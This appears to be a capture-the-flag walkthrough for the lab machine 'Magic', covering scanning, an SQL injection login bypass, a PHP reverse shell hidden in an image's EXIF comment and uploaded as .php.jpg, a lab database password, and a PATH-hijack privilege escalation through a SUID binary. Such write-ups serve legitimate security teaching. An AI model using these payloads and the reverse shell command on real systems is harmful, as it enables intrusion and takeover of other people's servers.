# Magic walkthrough

Machine ip: 10.10.10.185

Nmap output:

```
# Nmap 7.80 scan initiated Tue Apr 28 11:42:37 2020 as: nmap -sS -sV -sC -p 0-8081 -o nmap.txt 10.10.10.185
Nmap scan report for 10.10.10.185
Host is up (0.050s latency).
Not shown: 8080 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 28 11:43:08 2020 -- 1 IP address (1 host up) scanned in 30.71 seconds
```

## User

On port 80 is hosted a website that required a login but a simple sql injection can get us in:
```
' OR '1'='1
```

The protected area allow us to upload images but the images are poorly handled during the visualization so
we can upload a corrupted image with this payload to get a shell:

```
<?php
  exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.249/4444 0>&1'");
?>
```
in order to create this image we can use extitfool tool:

```
exiftool -comment='<?php
  exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.249/4444 0>&1'");
?>'
immagine.jpg
```

we can now rename it .php.jpg and upload it. After that, we only need to go to the url where the image was uploaded to get
the shell running. To get an interactive shell we can also run:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Enumeration is the key to find a config file for the database showing us the password for the databse itself.
Running this commad with mysqldump we can get the password for theseus (for the machine and not only for the databse ):
```
mysqldump --user="theseus" --password="iamkingtheseus" Magic login
```
The user flag is inside the home folder of Theseus.

## Root

After a linpeas enumation a SUID binary is shown: sysinfo.

This binary calls some services so we can change the path variable to call our modified service.

For example we can change lshw as follow:

```
echo "/bin/sh" > lshw
chmod +x lshw
export PATH=/tmp:$PATH
```
and then run the sysinfo command.

Thanks to this vulnerability we can get a shell with high privileges and grab the root flag. 
